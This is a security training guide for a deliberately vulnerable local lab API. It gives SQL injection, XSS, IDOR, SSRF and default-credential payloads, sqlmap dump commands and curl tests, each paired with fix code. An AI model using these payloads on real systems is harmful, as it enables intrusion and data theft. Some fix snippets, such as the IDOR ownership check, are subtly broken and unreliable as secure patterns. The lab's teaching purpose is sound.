# PentestLab Enterprise v2.0 - Complete Testing & Exploitation Guide

## üìã Table of Contents
1. Getting Started
2. Vulnerability Testing Guides (Per Tool)
3. Exploitation Techniques
4. Defensive Measures
5. Advanced Scenarios

---

## üöÄ Quick Start

### Installation
```bash
# Clone and setup
cd c:\vuln_api_testing
pip install -r requirements.txt

# Run the vulnerable API
python pentestlab_api.py

# API runs on http://localhost:5000
```

### Import Postman Collection
1. Open Postman
2. Click "Import" ‚Üí Select `PENTESTLAB_POSTMAN_COLLECTION.json`
3. Set `base_url` variable to `http://localhost:5000`
4. Start testing!

---

## üü¥ CRITICAL VULNERABILITIES

### 1Ô∏è‚É£ SQL Injection (WEB-2021-A01)

#### **Boolean-Based Blind SQL Injection**

**Postman Steps:**
```
GET /api/injection/sqli/boolean?username=' OR '1'='1
```

Expected Response:
```json
{
  "ok": true,
  "query": "SELECT * FROM user WHERE username = ' OR '1'='1'",
  "results": [
    {"id": 1, "username": "admin", "email": "admin@test.com"},
    {"id": 2, "username": "user1", "email": "user1@test.com"}
  ],
  "count": 2
}
```

**SQLMap Commands:**
```bash
# Basic injection test
sqlmap -u "http://localhost:5000/api/injection/sqli/boolean?username=1" --dbs

# Enumerate databases
sqlmap -u "http://localhost:5000/api/injection/sqli/boolean?username=1" --dbs --batch

# Extract tables
sqlmap -u "http://localhost:5000/api/injection/sqli/boolean?username=1" -D pentestlab --tables

# Dump data
sqlmap -u "http://localhost:5000/api/injection/sqli/boolean?username=1" -D pentestlab -T user --dump

# Exploit with custom payload
sqlmap -u "http://localhost:5000/api/injection/sqli/boolean?username=1" --technique=B --level=5 --risk=3
```

**Burp Suite Steps:**
1. Send request to `/api/injection/sqli/boolean?username=test`
2. Right-click ‚Üí "Send to Scanner"
3. Scanner detects potential SQLi
4. Modify request in Intruder:
   - Payload: `' OR '1'='1` | `' OR 1=1--` | `admin'--` | `1' UNION SELECT NULL--`
5. Check response: Does it return multiple users?

**Curl Commands:**
```bash
# Test 1: OR condition
curl "http://localhost:5000/api/injection/sqli/boolean?username=' OR '1'='1"

# Test 2: Comment bypass
curl "http://localhost:5000/api/injection/sqli/boolean?username=admin'--"

# Test 3: Response comparison
curl "http://localhost:5000/api/injection/sqli/boolean?username=admin' AND '1'='1"
curl "http://localhost:5000/api/injection/sqli/boolean?username=admin' AND '1'='2"
```

**Manual Exploitation (Python):**
```python
import requests

# Test OR clause
username = "' OR '1'='1"
response = requests.get(
    "http://localhost:5000/api/injection/sqli/boolean",
    params={"username": username}
)

if response.json()['count'] > 1:
    print("‚úì SQL Injection Confirmed!")
    print(f"Users found: {response.json()['results']}")
```

**Payloads to Test:**
- `' OR '1'='1`
- `' OR 1=1--`
- `admin'--`
- `' OR 'x'='x`
- `1' OR '1=1`
- `' UNION SELECT NULL--`
- `' AND SLEEP(5)--`

**Defensive Measures:**
```python
# VULNERABLE
query = f"SELECT * FROM users WHERE username = '{username}'"
result = cursor.execute(query)

# SECURE - Parameterized Query
query = "SELECT * FROM users WHERE username = ?"
result = cursor.execute(query, (username,))

# SECURE - ORM
user = User.query.filter_by(username=username).first()
```

**Detection (SAST):**
- Look for: String concatenation in SQL queries
- Pattern: `f"SELECT ... WHERE ... = '{variable}'"`
- Tool: SonarQube, Checkmarx, Semgrep

---

#### **Time-Based Blind SQL Injection**

**Postman Steps:**
```
GET /api/injection/sqli/time-based?id=1' AND SLEEP(5)--
```

Monitor Response Time: Should be ~5+ seconds

**SQLMap Command:**
```bash
sqlmap -u "http://localhost:5000/api/injection/sqli/time-based?id=1" --technique=T --time-sec=5
```

**Burp Intruder Payloads:**
- `' AND SLEEP(5)--`
- `' AND BENCHMARK(10000000,MD5('test'))--`
- `1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--`

---

### 2Ô∏è‚É£ Cross-Site Scripting (XSS)

#### **Reflected XSS**

**Postman Steps:**
```
GET /api/xss/reflected?message=<img src=x onerror="alert('XSS')">
```

Response will include unescaped HTML:
```html
<p><img src=x onerror="alert('XSS')"></p>
```

**Browser Testing URL:**
```
http://localhost:5000/api/xss/reflected?message=<h1>Hacked</h1>
http://localhost:5000/api/xss/reflected?message=<script>alert('XSS')</script>
```

**Burp Intruder Payloads:**
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
<body onload=alert(1)>
"><script>alert(1)</script>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
```

**FFUF Fuzzing:**
```bash
ffuf -u "http://localhost:5000/api/xss/reflected?message=FUZZ" \
  -w xss_payloads.txt \
  -fc 404 \
  -fw 0
```

**Defensive Fix:**
```python
from html import escape

@app.route('/api/xss/reflected', methods=['GET'])
def xss_reflected():
    message = request.args.get('message', '')
    # SECURE: Escape HTML
    escaped = escape(message)
    html = f"<p>{escaped}</p>"
    return html
```

---

#### **Stored XSS**

**Exploitation Steps:**
1. POST malicious comment:
```bash
curl -X POST http://localhost:5000/api/xss/stored \
  -H "Content-Type: application/json" \
  -d '{"comment":"<img src=x onerror=\"alert(document.cookie)\">"}'
```

2. GET comments list:
```bash
curl http://localhost:5000/api/xss/stored
```

Script executes for **every user** who views comments!

---

### 3Ô∏è‚É£ Insecure Direct Object Reference (IDOR)

**Postman Steps:**
```
GET /api/access/idor/1  ‚Üí Admin user data (SSN, salary)
GET /api/access/idor/2  ‚Üí User 2 data (lateral movement)
GET /api/access/idor/999 ‚Üí Try enumeration
```

**FFUF Enumeration:**
```bash
ffuf -u "http://localhost:5000/api/access/idor/FUZZ" \
  -w numbers.txt \
  -fc 404
```

**Burp Intruder:**
1. Send request to `/api/access/idor/1`
2. Set Intruder Payload to numbers: 1-1000
3. Filter responses by size/content
4. Extract compromised data

**Why It's Vulnerable:**
```python
# NO AUTHORIZATION CHECK!
@app.route('/api/access/idor/<int:user_id>')
def idor_access(user_id):
    # Returns ANY user data without checking ownership
    users = {1: {...}, 2: {...}, 3: {...}}
    return users[user_id]  # DANGEROUS!
```

**Fix:**
```python
from flask_jwt_extended import jwt_required, get_jwt_identity

@app.route('/api/access/idor/<int:user_id>')
@jwt_required()
def idor_access(user_id):
    current_user = get_jwt_identity()
    user = User.query.get(user_id)
    
    # SECURE: Check ownership
    if user.id != user_id and not current_user.is_admin:
        return {'error': 'Unauthorized'}, 403
    
    return user.to_dict()
```

---

## üü† HIGH SEVERITY

### 4Ô∏è‚É£ Information Disclosure - Exposed Configuration

**Postman:**
```
GET /api/config/exposed
```

**Response Exposes:**
- Database password: `database123`
- API keys: `sk_test_abcd1234`
- AWS credentials: `AKIA1234567890ABCDEF`
- JWT secret: `jwt-pentestlab-2026-secret`

**Impact:**
- Database compromise
- Payment processor hijacking
- AWS account takeover

**Fix:**
```python
from flask import current_app
import os
from dotenv import load_dotenv

load_dotenv()

@app.route('/api/config/exposed', methods=['GET'])
def config_endpoint():
    # SECURE: Return only safe config from environment
    if not is_admin_user():
        return {'error': 'Unauthorized'}, 403
    
    return {
        'safe_config': {
            'api_version': os.getenv('API_VERSION'),
            'features_enabled': os.getenv('FEATURES')
        }
    }
```

---

## üü° MEDIUM SEVERITY

### 5Ô∏è‚É£ Broken Authentication - Default Credentials

**Postman:**
```bash
POST /api/auth/login
Body: {"username": "admin", "password": "admin"}
```

Response: Valid JWT token with admin privileges

**Common Default Credentials to Test:**
- admin/admin
- admin/123456
- admin/password
- root/root
- test/test
- guest/guest

**Fix:**
```python
# SECURE: Force password change on first login
@app.route('/api/auth/login', methods=['POST'])
def login():
    user = User.query.filter_by(username=username).first()
    
    if not user or not check_password_hash(user.password_hash, password):
        return {'error': 'Invalid credentials'}, 401
    
    if user.force_password_change:
        return {'warning': 'Must change password on first login'}, 401
    
    token = create_access_token(identity=user.id)
    return {'token': token}
```

---

### 6Ô∏è‚É£ SSRF - Server-Side Request Forgery

**Postman:**
```bash
POST /api/ssrf/fetch
Body: {"url": "http://169.254.169.254/latest/meta-data/"}
```

Attacker can:
- Access AWS metadata (credentials)
- Attack internal services
- Scan internal network

**Payloads:**
```
http://169.254.169.254/latest/meta-data/
file:///etc/passwd
http://localhost:8080/admin
http://127.0.0.1:6379/  (Redis)
http://169.254.169.254/  (Azure metadata)
```

**Fix:**
```python
from urllib.parse import urlparse
import ipaddress

def is_safe_url(url):
    parsed = urlparse(url)
    
    # SECURE: Whitelist allowed domains/IPs
    allowed_hosts = ['api.trusted-service.com', 'data.company.internal']
    
    if parsed.hostname not in allowed_hosts:
        return False
    
    # Block private IPs
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback:
            return False
    except:
        pass
    
    return True

@app.route('/api/ssrf/fetch', methods=['POST'])
def ssrf_fetch():
    url = request.json['url']
    
    if not is_safe_url(url):
        return {'error': 'URL not allowed'}, 403
    
    response = requests.get(url)
    return response.json()
```

---

## üß™ TESTING WITH DIFFERENT TOOLS

### Burp Suite CLI (headless testing)

```bash
# Scan for SQLi
java -jar burpsuite_pro.jar --scan-config-file=/path/to/sqli_config.xml \
  http://localhost:5000

# Generate report
java -jar burpsuite_pro.jar --scan-report=report.html
```

### OWASP ZAP

```bash
# Start ZAP in daemon mode
zaproxy -daemon -port 8090 -config api.disablekey=true

# Run spider
curl http://localhost:8090/JSON/spider/action/scan?url=http://localhost:5000

# Run active scan
curl http://localhost:8090/JSON/ascan/action/scan?url=http://localhost:5000

# Export report
curl http://localhost:8090/JSON/reports/action/generate?title=PentestLab
```

### FFUF - Fuzzing

```bash
# Parameter fuzzing
ffuf -u "http://localhost:5000/api/FUZZ" -w api_endpoints.txt

# Value fuzzing
ffuf -u "http://localhost:5000/api/access/idor/FUZZ" -w numbers.txt

# SQL injection
ffuf -u "http://localhost:5000/api/injection/sqli/boolean?username=FUZZ" \
  -w sqli_payloads.txt \
  -mr "\"count\": [2-9]"  # Match if count > 1
```

### SQLMap (SQL Injection Automation)

```bash
# Complete database dump
sqlmap -u "http://localhost:5000/api/injection/sqli/boolean?username=1" \
  --dump-all \
  --batch \
  -v 3

# Custom injection point
sqlmap -u "http://localhost:5000/api/injection/sqli/boolean?username=*" \
  -p username \
  --dbs

# UNION-based extraction
sqlmap -u "http://localhost:5000/api/injection/sqli/union?search=1" \
  --technique=U \
  -D pentestlab -T user --columns --dump
```

---

## üõ°Ô∏è DEFENSIVE IMPLEMENTATIONS

### 1. Input Validation & Sanitization

```python
from bleach import clean
from html import escape
import re

def validate_username(username):
    """Validate username format"""
    # SECURE: Only allow alphanumeric and underscores, 3-20 chars
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Invalid username format")
    return username

def sanitize_comment(comment):
    """Remove XSS from user input"""
    # SECURE: Strip dangerous tags, allow safe HTML
    allowed_tags = ['p', 'br', 'strong', 'em']
    return clean(comment, tags=allowed_tags, strip=True)

# Use in application
@app.route('/auth/register', methods=['POST'])
def register():
    try:
        username = validate_username(request.json['username'])
        comment = sanitize_comment(request.json.get('bio', ''))
        # ... proceed with safe values
    except ValueError as e:
        return {'error': str(e)}, 400
```

### 2. SQL Parameterization

```python
# VULNERABLE
query = f"SELECT * FROM users WHERE id = {user_id}"
result = db.execute(query)

# SECURE
query = "SELECT * FROM users WHERE id = ?"
result = db.execute(query, (user_id,))

# SECURE with ORM (SQLAlchemy)
user = User.query.filter_by(id=user_id).first()
```

### 3. Authentication Hardening

```python
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime, timedelta

class User(db.Model):
    # ... fields ...
    password_hash = db.Column(db.String(255))
    last_login = db.Column(db.DateTime)
    failed_attempts = db.Column(db.Integer, default=0)
    locked_until = db.Column(db.DateTime)
    
    def set_password(self, password):
        """Hash password securely"""
        if len(password) < 12:
            raise ValueError("Password must be 12+ characters")
        self.password_hash = generate_password_hash(password, method='pbkdf2:sha256')
    
    def verify_password(self, password):
        """Check password with rate limiting"""
        # Check if account is locked
        if self.locked_until and self.locked_until > datetime.utcnow():
            raise LoginError("Account temporarily locked")
        
        if check_password_hash(self.password_hash, password):
            self.failed_attempts = 0
            self.last_login = datetime.utcnow()
            db.session.commit()
            return True
        else:
            # Increment attempts
            self.failed_attempts += 1
            
            # Lock after 5 attempts
            if self.failed_attempts >= 5:
                self.locked_until = datetime.utcnow() + timedelta(minutes=15)
            
            db.session.commit()
            raise LoginError("Invalid credentials")

@app.route('/api/auth/login', methods=['POST'])
def login():
    user = User.query.filter_by(username=username).first()
    
    try:
        user.verify_password(password)
        token = create_access_token(identity=user.id)
        return {'token': token}, 200
    except LoginError as e:
        return {'error': str(e)}, 401
```

### 4. CORS Configuration

```python
from flask_cors import CORS

# VULNERABLE: Allow all origins
CORS(app)

# SECURE: Whitelist specific origins
cors_config = {
    "origins": ["https://trusted-app.com", "https://app.company.com"],
    "methods": ["GET", "POST"],
    "allow_headers": ["Content-Type", "Authorization"],
    "expose_headers": ["X-Total-Count"],
    "supports_credentials": True,
    "max_age": 3600
}

CORS(app, resources={"/api/*": cors_config})
```

---

## üìä Assessment Checklist

After testing each vulnerability, verify:

- [ ] Vulnerability confirmed with multiple payloads
- [ ] Root cause identified in source code
- [ ] Impact severity assessed
- [ ] Business impact documented
- [ ] Fix code written  
- [ ] Fix tested
- [ ] Defense pattern replicated


## üéì Learning Path

**Beginner (Start here):**
1. SQL Injection (Boolean-based)
2. Reflected XSS
3. IDOR (User enumeration)

**Intermediate:**
4. Time-based SQLi
5. Stored XSS
6. Information Disclosure

**Advanced:**
7. SSRF with metadata
8. Race conditions
9. Business logic bypass

---

## üöÄ Next Steps

1. **Run the API**: `python pentestlab_api.py`
2. **Import Postman Collection**: Upload `PENTESTLAB_POSTMAN_COLLECTION.json`
3. **Test with Postman**: Use provided requests as templates
4. **Use SQLMap**: Automate SQL injection exploitation
5. **Run OWASP ZAP**: Comprehensive vulnerability scanning
6. **Document Findings**: Use provided checklists
7. **Implement Fixes**: Use defensive code examples
8. **Learn & Practice**: Progress through learning path

---

**Created for PentestLab Enterprise v2.0**  
*Professional Security Training Platform*
